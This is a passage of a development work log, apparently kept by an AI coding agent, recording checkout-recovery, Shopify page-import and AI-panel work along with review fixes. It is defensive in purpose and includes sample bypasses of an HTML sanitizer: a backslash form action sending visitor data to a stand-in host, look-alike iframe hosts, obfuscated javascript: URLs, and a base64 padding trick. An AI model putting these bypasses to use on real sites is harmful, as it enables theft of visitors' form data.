@@ -2987,3 +2987,527 @@ stale-funnel guards already prevent the observable bug (wrong funnel's data
 painting) and aborting is an optimisation, not a correctness fix.
 STATUS: COMPLETE
 ---
+
+---
+TIMESTAMP: 2026-08-09 22:30
+TASK: Abandoned Checkouts — parity with the reference tool (feat/abandoned-complete)
+BUILT: Audited our Shopify-only abandoned list against funnel-os's funnel-session
+version, then closed the gaps. New service server/src/services/abandonedRecovery.js
+holds the whole recovery lane: the single definition of "abandoned" (grace window
+from ABANDON_MINUTES, clamped 5..1440), HMAC-signed recovery-link tokens
+(base64url payload so ids containing dots survive), the sidecar record shape, the
+normalized cart summary, and the outbound Klaviyo "Abandoned Checkout" nudge
+(two-layer idempotency copied from klaviyoEvents: lb_integration_sends claim
+before the network call + the same ref as Klaviyo's unique_id, released on every
+path where the event did not land). New sidecar table crm_recovery_meta via the
+ensureTables pattern. server/src/routes/abandonedCheckouts.js now serves ONE list
+over TWO populations (co_sessions + crm_abandoned_checkouts) through a windowed
+CTE, plus detail (full cart + session events), manual status override, mint-link,
+send-nudge, and a detector sweep; recovered attribution is a WINDOWED SWEEP rather
+than a settle hook because the money path belongs to another lane. Client page
+extended in place: source/status/days filters, five-cell KPI strip, recovery pill
++ per-row actions, cart-contents modal. The public resume endpoint was deliberately
+NOT built — its contract is specified in the route file header for the integrator.
+TESTED: server/tests/abandoned/recovery.mjs 133/133 (pure logic; grace clamps,
+settled-beats-everything, missing-clock fail-safe, token tamper/expiry/wrong-secret,
+jsonb both shapes, malformed input on every entry point, and the nudge's failure
+paths driven through the _deps seam: vendor 500, throw between claim and send,
+failing release, dedup, Klaviyo off). server/tests/abandoned/route.mjs 90/90 (real
+router + real authenticate + real SQL on embedded PG :5433; grace-window
+membership, both populations, filters, LIKE-escape, 401/400/404/409/422 paths,
+exactly-once across two sweeps, vendor-500-then-retry, recovered attribution with a
+negative control for a payment predating the nudge, and an explicit assertion that
+no session status, cart total or order was touched). Full server booted against the
+scratch DB: listened, route mounted, 401 without a token. vite build exit 0. eslint
+0 errors on all four touched files (server files linted under a node-globals config
+because the repo's only eslint config is client/browser-scoped; positive control:
+that same config reports 114 errors elsewhere in server/src).
+OUTPUT: 133/133 + 90/90, both re-run clean; build exit 0; lint exit 0.
+DECISIONS: (1) the outbound nudge lives in abandonedRecovery.js rather than as a
+fourth export on klaviyoEvents.js — klaviyoEvents loads from co_sessions, which
+cannot serve Shopify checkouts, and the file is documented as dormant for the
+integrator's call-site map (DECISION MADE). (2) recovered counts/revenue are read
+from the sidecar, not from the list rows: a revived cart that settles leaves the
+unpaid set entirely, so counting recoveries off the list would erase exactly the
+wins being measured (DECISION MADE). (3) "unpaid" is expressed negatively
+(status <> 'paid' AND paid_at IS NULL) rather than as a list of pending statuses,
+so a status added elsewhere cannot silently start emailing live recovery links
+(DECISION MADE). (4) no boot against the production .env — the root .env points at
+the live Render database and the list route runs CREATE TABLE and can hit live
+Shopify (DECISION MADE).
+TIMESTAMP: 2026-08-09 23:59
+TASK: AI Developer extras — parity with the reference tool (branch feat/ai-developer-extras)
+BUILT: Four extras on top of the AI Developer panel. (1) MODEL PICKER: the server
+already enforced an allowlist but did not expose it, so the panel hardcoded a
+copy; added GET /api/v1/ai-developer/models serving the list + default, and the
+panel now populates from it with the local list kept only as a fallback. (2)
+SCREENSHOTS: added a magic-number content-type sniff (PNG/JPEG/GIF/WEBP) that
+refuses a blob whose bytes contradict its declared media_type, since that string
+is relayed to Anthropic verbatim; caps moved to the brief's 4MB x 2. (3)
+ATTACHED-CONTEXT CHIPS: resolveAttachment derives the chip's type and excerpt
+from the page's REAL blocks so a spoofed `kind` cannot make the chip lie; the
+resolved value rides the system prompt, the done frame, the stored turn, and a
+per-message chip in the transcript; detaching is now reversible. (4) PERSISTED
+THREAD: new self-contained schema owner server/src/services/aiDeveloperSchema.js
+(ensureTables pattern) — table lb_ai_dev_chats, ONE ROW PER MESSAGE, bounded to
+the newest 50 by a prune in the same transaction as the insert; GET/DELETE
+/chat, both funnel-pinned; reads tolerate BOTH jsonb shapes. Image BYTES are
+never persisted, only a count.
+TESTED: Three new harnesses in server/tests/ai-developer/, all in-process.
+validation.mjs (130) covers the pure parts: allowlist membership, the sniffer,
+caps, resolveAttachment, thread bounding, both-shapes jsonb, and that nothing in
+the store path can carry image bytes. thread-routes.mjs (57) mounts the REAL
+router on embedded PG: round-trip, the 50-bound keeping the NEWEST 50, the
+cross-funnel 404 deleting NOTHING, archived-page 404, jsonb_typeof = object.
+chat-turn.mjs (44) drives a full SSE turn against a MOCK Anthropic server.
+EDGE CASES RUN (all pass): thread write throws mid-turn (table renamed away) —
+the turn still streams and still delivers its reply; thread read throws — clean
+500 that leaks no relation name, and the endpoint recovers with no wedged state;
+ANTHROPIC_API_KEY missing — clean 503; a refused model / mismatched image /
+off-page attachment costs ZERO Anthropic calls (the mock counts them); double
+DELETE returns 0 rather than erroring; null/empty/unstorable appends write
+nothing without throwing.
+OUTPUT: 130/130 + 57/57 + 44/44 = 231/231 new. Regressions all green:
+ai-ops-wiring 31/31, builder-model 181/181, page-versions 93/93, code-doc
+107/107, version-format 26/26, breakpoint-render 49/49, variant-search 94/94.
+vite build 0 errors (865ms, 2700 modules). eslint 0 errors 0 warnings on the
+panel and PageBuilderPage. Commits 20dcffd (server) + 21024ed (client), 6 files,
++1648/-49. None of funnelRender.js / checkoutPublic.js / funnels.js / app.js
+touched. git merge-tree against the ADVANCED main exits 0 — merges cleanly.
+DECISIONS:
+(1) DECISION MADE — image bytes are PASS-THROUGH ONLY, never persisted. The
+reference (lb_ai_developer_service._upload_images) uploads operator screenshots
+to object storage and stores their URLs; we store only image_count. The
+conservative choice: no new blob lifecycle, no retention question, no way for a
+stored thread to leak a screenshot. Cost: a rehydrated turn shows "N screenshots
+(not stored)" instead of thumbnails, which the panel says explicitly.
+(2) DECISION MADE — image caps set to the brief's 4MB x 2. Per-image ceiling is
+UP from 2MB (a loosening) but count is DOWN from 5, so the worst-case accepted
+payload FALLS from 10MB to 8MB. Flagged because raising any existing cap is a
+weakening in isolation.
+(3) DECISION MADE — ONE ROW PER MESSAGE rather than the reference's single doc
+with an embedded array. The bound becomes a DELETE in the insert's transaction,
+which removes the read-modify-write window where two concurrent turns each
+append to a stale copy and one is lost.
+(4) DECISION MADE — GET/DELETE /chat take page_id/funnel_id as QUERY params, not
+a body, so DELETE carries no body.
+(5) Not built: the reference's /chat/applied and /memory endpoints. Out of the
+brief's scope; noted rather than silently skipped.
+TWO DEFECTS FOUND BY EXECUTION, NOT REVIEW:
+(a) jsonb double-encoding. Under postgres.js, `$n::jsonb` on a JSON-text param
+sends the string ALREADY JSON-encoded, so the column held a jsonb STRING:
+jsonb_typeof answered 'string' and attachment->>'block_id' answered NULL — the
+chip would have silently lost its target on every read. Fixed to `$n::text::jsonb`
+(probed both forms directly: ::jsonb -> 'string', ::text::jsonb -> 'object').
+Worth recording: the FIRST harness run PASSED a byte-order comparison of the
+round-tripped attachment precisely BECAUSE a stored string round-trips
+byte-identically. Real jsonb reorders keys — the reorder is what exposed the bug,
+and the "passing" assertion had been masking it. The assertion is canonical now.
+(b) Model-allowlist coercion hole. The check ran on String(body.model), and
+String(['claude-fable-5']) is 'claude-fable-5' — as is the output of an object
+with a hand-written toString. Either would satisfy includes() and select a model
+the caller never legally named. Now requires typeof === 'string'. Coercion is
+not membership.
+STATUS: COMPLETE
+---
+
+---
+TIMESTAMP: 2026-08-09 23:05
+TASK: Abandoned Checkouts — adversarial review FIX-FIRST pass (feat/abandoned-complete)
+BUILT: Fixed all 5 gating + 4 major findings, and 7 of 7 minors. B1: the Klaviyo
+event value read row.total while every real caller emits total_price (CTE +
+loadOne alias) — added cartTotal() reading both, so production events stop
+shipping at $0. B2: the detector held a SNAPSHOT and did no re-read, so a cart
+settling mid-sweep got emailed a live recovery link — sendRecoveryEvent now takes
+a `recheck` hook and both the sweep and POST /send re-read status/paid_at
+immediately before the send. B3: the Shopify sync fetched status=open, a feed a
+paid checkout LEAVES, so completed_at stayed NULL forever — switched to
+status=any bounded by created_at_min, which is what lets a completion reach the
+mirror at all. M4: attribution multi-credited one payment across every cart that
+email abandoned — a matched payment is now consumed, and the consume set is
+SEEDED FROM recovered_by so it survives across sweeps. M5: the HMAC key fell back
+to sha256('puure-resume:'), a derivable constant — mint now throws
+RecoverySecretError and verify fails closed; Shopify rows no longer mint a token
+they never use. M6/M7: sent_at is first-stamp-wins in SQL and the sweep stamps on
+deduped too, so a deduped resend cannot move the attribution clock AND a lost
+stamp self-heals. M8: bounded 429 retries. M9: per-operator checkRateLimit on
+sweep/send/link/sync + the route header now states there is no cron in
+render.yaml. M10-M16: notes merged not replaced, ORDER BY tiebreakers, page
+clamp, sync mutex + recency floor, client request-sequence guard.
+TESTED: recovery.mjs 164/164 (was 133) — new production-shaped sections 5b
+(settled evidence on real co_sessions rows), 5c (cartTotal column naming), 6b
+(secret mandatory), 9b (recheck). route.mjs 130/130 (was 90) — new sections 9b
+settle-mid-sweep (mutates the DB between snapshot and send via the trackEvent
+seam), 9c self-heal from a claim-with-no-sidecar row, 10b multi-credit (3 carts,
+1 payment, asserts exactly one credit at $500 AND that a repeat sweep does not
+multiply it), 10c Shopify sync learns completion behind a stubbed fetch + the 429
+loop bound, 10d rate limits + page clamp. vite build exit 0, node --check clean on
+all four files, eslint 0 errors, full server boots and both endpoints answer 401.
+OUTPUT: 164/164 + 130/130, exit 0 both. The repeat-sweep case FAILED first
+(n:2, v:1000) and exposed a bug the review's stated fix would not have closed:
+an in-memory-only consume set lets the next sweep re-spend the same payment on
+the next cart, so recovered revenue climbs once per sweep on static data. Fixed
+by seeding the set from recovered_by.
+DECISIONS: (1) DECLINED the "use gateway_session_id" half of M12, with evidence:
+checkoutPublic.js writes that column at INTENT time on a row still guarded
+`WHERE status = 'processing'`, so treating it as payment evidence would classify
+every gateway-reached cart as paid and silently disable the whole feature. The
+dead gateway_payment_id clause was REMOVED (that column lives on
+co_upsell_charges, never on co_sessions) and replaced with SETTLED_STATUSES
+(paid/deposit_paid/refunded) + paid_at + completed_at, pinned by a
+production-shaped test (DECISION MADE). (2) Attribution credits the MOST RECENTLY
+abandoned cart, not the earliest-nudged: a single sweep stamps every row inside
+the same millisecond, so sent_at carries no usable order and the winner was
+falling out of sweep row ordering — the rule is now explicit with a
+(source, ref_id) tiebreaker so the KPI is reproducible (DECISION MADE).
+(3) Sync bounded to 90 days of created_at: the list's own maximum window is 90d
+and the sweep looks back at most 30, so an older completion changes nothing we
+display (DECISION MADE).
+STATUS: COMPLETE
+---
+
+---
+TIMESTAMP: 2026-08-09 23:55
+TASK: Abandoned Checkouts — delta re-verify round (N1-N6 + M16 remainder)
+BUILT: N2 (gating) concurrent reconciles double-spending one payment: the credit
+is now taken in ONE statement with an AND NOT EXISTS guard on recovered_by,
+backed by a UNIQUE partial index on recovered_by, with SQLSTATE 23505 handled as
+a normal lost-race outcome rather than an error. A zero-row update now also
+consumes the payment for the rest of the pass (conservative: under-crediting
+self-corrects on the next sweep, over-crediting does not). N1: probed the LIVE
+store read-only before trusting the status=any change. M16 remainder: openDetail
+got the same reqSeq guard as load. N3: lastSyncAt is stamped in .finally so a
+failing Shopify does not launch a fresh crawl on every list load. N4:
+recovery_secret_unset answers 503, matching /recovery-link. N5: SETTLED_STATUSES
+documents deposit_paid as aspirational (no writer sets it in this repo; listing
+it can only make classification more conservative). N6: partial index
+(created_at DESC) WHERE completed_at IS NULL on the mirror table.
+TESTED: route.mjs 147/147 (was 130), recovery.mjs 164/164. New section 10b2 runs
+12 trials of 3 parallel list loads over 2 nudged carts + 1 payment, asserting the
+invariant attributed == real, plus a direct assertion that the UNIQUE index
+exists and a positive control that the database itself refuses a duplicate
+recovered_by, plus a check that NULL recovered_by stays repeatable.
+NEGATIVE CONTROL RUN: reverting to the f552e1d crediting path made this section
+report "bad trials = 11" and "attributed 11500 vs real 6000", so it genuinely
+reproduces the bug rather than passing vacuously. A FIRST attempt at the negative
+control PASSED while neutered, which showed the case was not yet exercising the
+race; it was tightened until it failed for the right reason. vite build exit 0,
+node --check clean on all four files, eslint 0 errors.
+OUTPUT: 147/147 + 164/164, exit 0 both; build exit 0.
+DECISIONS: (1) THE N1 LIVE PROBE REFUTED THE B3 PREMISE, and the code comment was
+rewritten to say so. Against 17cca0-2.myshopify.com (API 2024-01, read-only, token
+in header only): status=any and status=open returned BYTE-IDENTICAL bodies
+(26,163 B, same 5 ids); status=closed returned an empty checkouts array (16 B),
+proving the status parameter IS read and that this store simply has zero closed
+checkouts; and completed checkouts do NOT leave the open feed — 2 of the 5 oldest
+rows carry a completed_at and appear under both status values. So status=open was
+already capable of learning completion. status=any is KEPT as a costless superset
+but is no longer claimed to have fixed a demonstrated production failure. The
+two-pass (open+closed) fallback is DECLINED: its stated precondition ("if
+status=any is not honoured") did not occur, and a status=closed pass fetches 0
+rows on this store (DECISION MADE).
+(2) The probe identified the parameter that IS load-bearing: created_at_min is
+honoured (a 90-day floor dropped the 2025 rows and cleared the rel="next" link; a
+1-day floor returned 16 B) and the feed is ordered OLDEST-FIRST, so the previous
+unbounded crawl started at the store's most ancient checkouts and, on a store with
+more than 40x250 = 10,000 of them, would exhaust the page cap before reaching any
+recoverable cart. limit was probed too (5 to 2 shrank the body), so the page cap
+means what it says (DECISION MADE).
+STATUS: COMPLETE
+---
+
+---
+TIMESTAMP: 2026-08-10 00:15 (Europe/Madrid)
+TASK: Release deploy — Wave C + builder overhaul + settings suite + abandoned recovery + page library
+BUILT: Merged 13 review-cleared branches to main (analytics quartet, builder fix cycle x2 rounds,
+settings-tracking-extras x3 rounds, settings-commerce x2 rounds, page-library x2 rounds,
+abandoned-complete x3 rounds, analytics-report-tz) plus integrator wirings: custom-tracking renderer
+injection, checkout-countries gate (fail-closed policy / fail-open infra), public recovery-link
+resume endpoint. Deployed dep-d9sflbn10e5c739qf3p0 @ c54d314 (build 90s, live 22:11:20Z).
+TESTED: Merged-tree sweep 4,652 assertions green across 60 harnesses; 6 apparent failures proven to
+be harness UTC-vs-Madrid clock-window artifacts (engine correct; follow-up task spawned).
+Live pass: all new surfaces answering with honest empty states on prod; abandoned list carries real
+funnel-population rows; forged/expired resume tokens 302 home; published funnel serves, draft dark.
+OUTPUT: puure-dashboard.onrender.com live at c54d314.
+DECISIONS: Shipped without feat/clone-from-shopify (2 new gating cleaner findings; next release).
+STATUS: COMPLETE
+---
+
+---
+TIMESTAMP: 2026-08-09 22:55
+TASK: Clone-a-page "From Shopify" tab (feat/clone-from-shopify)
+BUILT: New read-only Shopify Admin proxy server/src/routes/shopifyPages.js
+mounted at /api/v1/shopify-pages (authenticate + funnels:access), plus the
+client tab client/src/components/funnels/shopify/ShopifyTab.jsx wired into
+ClonePageModal.jsx (the tab is no longer disabled). GET /list walks Admin
+REST pages.json with Link-header cursor paging (4-hop / 500-row cap, and it
+REPORTS `truncated` rather than silently clipping), returning
+{id,title,handle,updated_at,published,summary,is_theme_built,live_url} —
+body_html is summarised server-side and never forwarded. POST /import
+validates page_id (digits or a Page gid — it feeds a REST path), fetches the
+page, and runs pageClone.js's OWN scanHtml() on the body_html wrapped in a
+<body> element, with originalUrl=live_url, so the result is the
+byte-identical {sections,stats} shape /page-clone/scan returns and the modal
+reuses its existing picker and /page-clone/create. Credentials are read from
+env at call time and travel in X-Shopify-Access-Token only; 8s
+AbortController budget; redirect:'error'. Failure taxonomy mirrors
+shopifyVariants.js: 503 shopify_not_configured / shopify_auth_error
+(retryable:false) vs shopify_unavailable (retryable:true), 429 rate_limited
+(retryable:true), 422 theme_built for a page whose editor body has under 200
+chars of visible text. INPUT_MAX / ESCAPE_HATCH_MAX were exported from
+pageClone.js so the 413 thresholds are one number, not two.
+TESTED: new harness server/tests/clone-page/shopify-import.mjs 213/213
+(list happy path + limit cap; cursor paging and truncation honesty; empty
+store vs outage; 9 list failure classes incl. 401/403 as non-retryable;
+missing/malformed config incl. a store value carrying a path; a real fetched
+page flowing through the REAL scan pipeline asserted on section output,
+script/pixel/comment removal, surviving inline <style>, and CDN
+src/srcset/href absolutization; 7 page_id refusals incl. a dot-segment
+traversal attempt; 5 theme-built shapes; malformed 200s, non-string
+body_html, unbalanced markup, >10MB source and >2MB cleaned output; malformed
+JSON body; rate limit; the 8s abort; redirect:'error'). Regressions:
+clone-page scan-create 92/92, builder variant-search 94/94 (identical to the
+pre-change baseline). Real mount verified by booting routes/index.js — both
+paths answer 401, not 404. eslint on both touched client files: 0 errors.
+cd client && npx vite build: exit 0.
+OUTPUT: 213/213 + 92/92 + 94/94; build exit 0; eslint exit 0.
+DECISIONS: (1) The reference tool's Playwright "visual clone" fallback for
+theme-built pages was DROPPED — pageClone.js's stated invariant is that it
+never fetches a URL, so there is no SSRF surface by construction; we return
+an actionable 422 with the live URL instead (DECISION MADE). (2) Admin REST
+is the only transport, not GraphQL-with-REST-fallback: the Admin GraphQL
+`pages` connection does not exist on this repo's default SHOPIFY_API_VERSION
+(2024-01), and a fallback leg that can never be exercised is not a fallback
+(DECISION MADE). (3) The reference fires one import call per visible card to
+build previews; we compute `summary` and `is_theme_built` at LIST time, so
+the picker makes one Admin call, not N (DECISION MADE). (4) The reference
+passes source_url:null and leaves relative Shopify CDN paths broken; we
+absolutize against live_url through the existing rewriter (DECISION MADE).
+(5) This worktree is a worktree of Mineblock-LLC, not Puure-integrator as the
+brief stated — worktree isolation forbids operating on the other checkout, so
+the branch and commit landed here; the two repos are forks and every file the
+brief named exists here identically (DECISION MADE — needs a port to
+Puure-integrator if that was the intended target).
+STATUS: COMPLETE
+---
+
+---
+TIMESTAMP: 2026-08-09 23:40
+TASK: Clone-from-Shopify — adversarial review remediation (FIX-FIRST @ 53db9cd)
+BUILT: All four gating findings and all six minors closed on
+feat/clone-from-shopify, plus the M4 hardening policy decided by the
+integrator. B1: /list derived summaries from FULL body_html on the event
+loop shared with public checkout — reproduced at 1,945ms of synchronous block
+and +183MB heap for 500 x 292KB rows; every row is now sliced to
+BODY_PROBE_BYTES (16KB) and its text extracted ONCE for both the summary and
+the theme-built floor, with LIST_NODE_MAX x BODY_PROBE_BYTES bounded by
+LIST_BODY_BUDGET_BYTES and a runtime accumulator as backstop — re-measured at
+59ms / 21MB. M1: storefrontBase() memoised per process (5min on success, 60s
+on failure, keyed on store|apiVersion so a rotation invalidates), killing the
+2-5 Admin calls per request against the bucket shared with live checkout
+pricing; the modal now owns the fetched page list (cache/onLoaded) so Back
+from the picker no longer refetches. M2: permanent Shopify failures no longer
+masquerade as retryable outages — a new codeForStatus() maps 404 on a page
+fetch to HTTP 404 page_not_found, 402 to shopify_store_frozen, 423 to
+shopify_store_locked, other 4xx to shopify_rejected, all retryable:false,
+with shopify_unavailable reserved for 5xx/429/transport. M3: body_html is a
+FRAGMENT — feeding it to the splitter's whole-document heuristics dropped
+76.6% of a page on one stray </body>, silently, at 200; splitSections/scanHtml
+gained an additive `fragment` option (default off, paste/upload unchanged) and
+the Shopify path strips document wrappers first and reports the dropped bytes
+in stats. M4: cleanHtml now strips inline on* handlers, drops href/src/action
+carrying javascript:/vbscript: (entity- and control-char-obfuscated forms
+included), removes iframes whose host is off the exported IFRAME_EMBED_HOSTS
+allowlist, and disarms off-site form actions into data-original-action while
+keeping the form — four new counters surfaced as picker chips, on BOTH the
+paste and Shopify paths. Minors: fields= now rides every cursor hop; the
+short-page floor became a list BADGE not an import gate and its copy states
+the observation instead of guessing at the theme; truncation copy names the
+real remedy; the tab got a request-generation guard, an AbortController on
+unmount and stale-row Import locking; shop.json degrades on every status
+including 403 so the credential verdict comes from the load-bearing call;
+Retry-After is propagated and honoured by a countdown on Try again; the API
+version is anchored to /^\d{4}-\d{2}$/ because it is interpolated into a path.
+TESTED: shopify-import harness extended 213 -> 353 assertions, 353/353. New
+coverage: the B1 wall-time bound and the slice (a marker past the probe window
+is provably never read); the M1 memo across list+import, its failure memo and
+its rotation key; ALL outbound Admin calls counted in the rate-limit
+assertion (the old one counted only the pages mock — it measured a bound it
+did not enforce and missed shop.json entirely); every M2 status mapping over
+HTTP on both routes, including that a 404 on the LIST is NOT a page_not_found;
+four M3 fragment shapes each asserted to keep content on BOTH sides of the
+wrapper; M4 unit + end-to-end (5 obfuscated javascript: forms, look-alike
+embed hosts youtube.com.evil.com and evil-youtube.com, srcless iframe,
+off-site vs same-origin form); Retry-After parsing incl. HTTP-date and
+clamping; five malformed API versions refused and an unset one falling back.
+Regressions: scan-create 92/92 and variant-search 94/94, both identical to
+the pre-change baseline — M4 conflicted with NO existing assertion, so
+nothing was bent. node --check on all four touched server files: OK. eslint
+on both client files: 0 errors. cd client && npx vite build: exit 0. Mount
+re-verified by booting routes/index.js (401, not 404).
+OUTPUT: 353/353 + 92/92 + 94/94; build exit 0; eslint exit 0; B1 1945ms/183MB
+-> 59ms/21MB; M3 76.6% loss -> 0.
+DECISIONS: (1) M3 solved with an additive `fragment` option rather than
+pre-stripping <main>, so the operator's <main> element survives as markup
+while losing its ability to scope the split (DECISION MADE). (2) M4 lives in
+cleanHtml, i.e. the paste and upload tabs are hardened too — the integrator
+scoped it that way and the existing regression proves no paste-path assertion
+disagrees (DECISION MADE). (3) m1 `fields` on cursor hops asserts the shape of
+OUR request only: Shopify documents page_info as combinable with limit and
+fields, but there are no credentials in this environment to verify acceptance
+against the live store, and a live rejection would surface as
+shopify_rejected with the status in the log line (DECISION MADE — flagged as
+the one claim not closed by execution). (4) Three harness assertions I wrote
+in the first pass were VACUOUS and are recorded here because they passed
+while testing nothing: a naive /action="https:\/\/evil/ regex was satisfied by
+the data-original-action attribute the fix introduces; a "body not echoed"
+needle matched the legitimate summary; and an href assertion ignored that the
+link is absolutized. All three were re-anchored and mutation-checked
+(DECISION MADE).
+STATUS: COMPLETE
+---
+
+---
+TIMESTAMP: 2026-08-10 00:20
+TASK: Clone-from-Shopify — delta re-verify, final gate (2 new findings in the shared cleaner)
+BUILT: Both new gating items closed inside pageClone.js, plus the two nits.
+G1 (form-action bypass): the off-site test was a forward-slash-only regex, so
+<form action="\\evil.tld/harvest"> cleared it with forms_neutralized=0 while
+every browser resolves that string to https://evil.tld/harvest — visitor form
+data exfiltrating from a page we serve. Reproduced verbatim before the fix.
+The decision is now made by the URL PARSER: a new exported resolvedHost() /
+isOffsiteUrl() pair resolves the value against the https://relative.invalid
+sentinel base (the same parse iframeHost already used) and calls it off-site
+when the resulting hostname is neither empty nor the sentinel. That also
+catches two variants the report did not name — /\evil.tld/x and \/evil.tld/x —
+which the old regex cleared too, while /local, \local, ?q=1 and '' stay
+on-site. G2 (cleaner perf): the per-attribute-per-tag `new RegExp` made
+cleanHtml 1,109 ms for a 10MB / ~414k-tag document — the same event-loop-block
+class as B1 but on POST /page-clone/scan, reachable from paste and upload. The
+nine attribute names are folded into ONE module-scope alternation
+(UNSAFE_URL_ATTR_RE), and FORM_TAG_RE / FORM_ACTION_RE are hoisted too, which
+also collapses nine passes over each tag's attributes into one: re-measured at
+193-203 ms. NITS: a row past the derivation budget now reports
+is_theme_built: null ("not derived") instead of false, because false is a
+positive claim that the page has content; and storefrontBase() gained
+{retryDegraded} so an IMPORT never inherits a degraded myshopify-fallback
+answer — the list may reuse it for its 60s window because it is ephemeral, but
+an import's live_url is what absolutizes asset paths and those absolute URLs
+are SAVED into the page's blocks, so a degraded answer would bake the wrong
+canonical host into a page permanently.
+TESTED: shopify-import 353 -> 382 assertions, 382/382. New coverage: 12
+isOffsiteUrl cases incl. all three backslash authority forms and the
+same-origin negatives, resolvedHost proving the host comes from the parser;
+the backslash form asserted end-to-end through /import (forms_neutralized=1,
+no live action attribute, data-original-action kept, form survives); a PINNED
+cleanHtml budget of 600ms at the real 10MB INPUT_MAX ceiling, asserted the way
+LIST_BODY_BUDGET_BYTES is, plus two assertions that the pass is still doing
+the work rather than short-circuiting to look fast (all-zero counters on clean
+input, and a needle found buried in 400 clean tags); the budget backstop
+emitting null and no invented summary; and the degraded-memo split (list
+reuses, every import re-attempts, a healthy answer is memoised for imports too
+and yields the canonical domain). Regressions: scan-create 92/92 and
+variant-search 94/94, both still identical to the pre-change baseline.
+node --check on all four server files OK; eslint 0 errors; vite build exit 0;
+mount re-verified at 401 for both shopify-pages routes and page-clone/scan.
+OUTPUT: 382/382 + 92/92 + 94/94; build exit 0; eslint exit 0. G1
+forms_neutralized 0 -> 1 on the backslash fixture. G2 1,109ms -> 203ms at
+INPUT_MAX.
+DECISIONS: (1) The off-site decision is now shared with the iframe allowlist
+through one resolvedHost(), so the two guards can no longer disagree about
+what "off-site" means (DECISION MADE). (2) The cleanHtml budget is pinned at
+600ms against a measured 203ms — roughly 3x headroom, loose enough not to
+flake on a loaded machine and tight enough to catch the 5-20x regression class
+this finding belongs to (DECISION MADE). (3) The degraded-import re-attempt
+costs one extra Admin call per import, but ONLY while /shop.json is actually
+failing, and it stays inside the rate limiter — chosen over shrinking the
+failure TTL globally, which would have restored the per-request fan-out on the
+list that the memo exists to prevent (DECISION MADE).
+STATUS: COMPLETE
+---
+
+---
+TIMESTAMP: 2026-08-10 00:30
+TASK: Fix UTC-vs-Madrid day-key flake in costs test harnesses (+ metrics-ui)
+BUILT: Replaced harness-local UTC day helpers with REPORT_TZ (Madrid) helpers
+from server/src/services/reportTz.js so fixtures and the engine share one
+calendar. costs/engine.mjs: D() now uses reportDaysAgo (funnelCosts.daysAgo
+slices UTC and disagrees with dayKey 22:00-24:00 UTC); T11/T15 fixture
+instants pinned to 10:00-report-tz of their intended day via reportDayStartIso.
+costs/routes.mjs, costs/spend.mjs, costs/contract.mjs: dayUtc() replaced with
+day()=reportDaysAgo + dayInstant() for session/upsell timestamps.
+builder-metrics/metrics-ui.mjs: all UTC-midnight anchors switched to report-tz
+midnight (MID SQL fragment); NOW()-minutes fixtures wrapped in
+GREATEST(..., MID + offset) so they can never cross the report-day boundary
+near midnight; window day now reportDayKey(). Engine code untouched.
+TESTED: All suites run IN the 22:00-24:00 UTC divergence window (real clock,
+22:27-22:35 UTC — the exact condition that produced the 6 verified failures:
+engine T15, routes R3/R6 x3, spend S4, plus metrics-ui) AND re-run with a JS
+clock shim (+2.5h -> 00:57 UTC, out-of-window; shim in session scratchpad,
+offset chosen so shifted JS "today" still equals the Madrid day PG NOW() sees,
+keeping PG-anchored fixtures coherent).
+OUTPUT: In-window: engine 116/0, routes 65/0, spend 48/0, contract 57/0,
+report-tz 18/0, metrics-ui 40/0. Out-of-window (shim): identical — all 0 failed.
+DECISIONS: Also fixed costs/contract.mjs and metrics-ui.mjs (same latent
+dayUtc/UTC-midnight pattern found by grep, per task instruction to sweep other
+suites); metrics/engine.mjs + metrics/routes.mjs already anchor to
+T0=todayInTz() with calendar arithmetic - correct, left alone;
+builder-metrics/analytics-report-tz.mjs uses UTC midnight deliberately (it
+tests the tz seam) - left alone. Fixture instants pinned at ~10:00 report-tz
+rather than now-minus-24h-multiples so they also survive DST-transition days
+(DECISION MADE).
+TIMESTAMP: 2026-08-10 00:35
+TASK: AI Developer extras — review round F1-F8 (branch feat/ai-developer-extras)
+BUILT: Fixed all eight review findings. F1 (GATING): MAX_IMAGE_BYTES was not
+enforced — the size formula stripped '=' globally before measuring and the
+charset regex admitted '=' anywhere, so a PNG header + 20M '=' chars measured 24
+bytes and relayed ~21MB. Replaced with two independent defenses: '=' legal only
+as 0-2 trailing chars, and Buffer.byteLength(clean,'base64') for the size. F2:
+bare base64 now ADOPTS the sniffed type instead of assuming png then blaming the
+caller. F3: added a thread EPOCH (new table lb_ai_dev_threads) so a DELETE
+issued mid-stream wins over an in-flight turn's persist. F4: the same epoch row
+is locked FOR UPDATE by every append, which serializes appends per thread and
+makes the prune bound EXACT; corrected the false "can never outrun" header. F5:
+attachment memo keyed on id/type/index, not the block object. F6: restored the
+cap inside the setState updater plus a generation token for late FileReaders.
+F7: whitespace-only user turns refused server-side (assistant turns exempt so a
+rehydrated thread cannot wedge the panel). F8: documented the archival-orphan
+retention as an explicit decision in the schema header.
+TESTED: validation 155/155 (was 130), thread-routes 77/77 (was 57), chat-turn
+62/62 (was 44). New cases: the pure-padding repro, the interleaved form, an
+assertion that the mock never receives more than the cap, all four image types
+bare, and the exact DELETE-mid-stream sequence.
+OUTPUT: 294/294 across the three ai-developer harnesses. Regressions green —
+ai-ops-wiring 31/31, builder-model 181/181, page-versions 93/93. vite build 0
+errors (934ms). eslint 0 errors 0 warnings. Commit e14744c.
+DECISIONS:
+(1) F1 fixed with TWO independent defenses rather than one. The charset fix
+alone would stop the known input; byteLength alone would stop it too. Keeping
+both means the measurement does not depend on the charset check being right,
+which is exactly the coupling that produced the bug.
+(2) F7 refuses empty USER turns only. Refusing empty assistant turns too would
+be stricter but would let a rehydrated thread containing one empty reply wedge
+the panel out of ever sending again — a worse failure than the one being fixed.
+(3) F4 taken as advisory-lock-equivalent (row lock on the epoch row) rather than
+accept-and-document, because F3 required that lock anyway. One mechanism, two
+findings closed, and the contract asserted under real concurrency instead of
+documented as approximate.
+(4) F8 retention: no FK/cascade. Archiving is reversible here and a restored
+page getting its conversation back is expected; a cascade would make page
+deletion silently destroy history, and this module owns no page-delete path.
+Bounded at 50 rows, no image bytes, unreachable via the API.
+TWO DEFECTS FOUND BY MY OWN NEW TESTS, MID-FIX:
+(a) The F4 concurrency assertion FAILED on its first run — 58 rows, not 50.
+Cause: `SELECT ... FOR UPDATE` that matches NO ROW locks NOTHING, so on a thread
+whose epoch row did not exist yet the lock was a no-op. appendThread now creates
+the row itself rather than trusting a caller to have opened it. The guarantee
+must not depend on call order.
+(b) My own epoch test cleared P1 and thereby emptied the thread a LATER test
+asserted a count of, which failed as "cleared: 0, want 2". Cross-test state in a
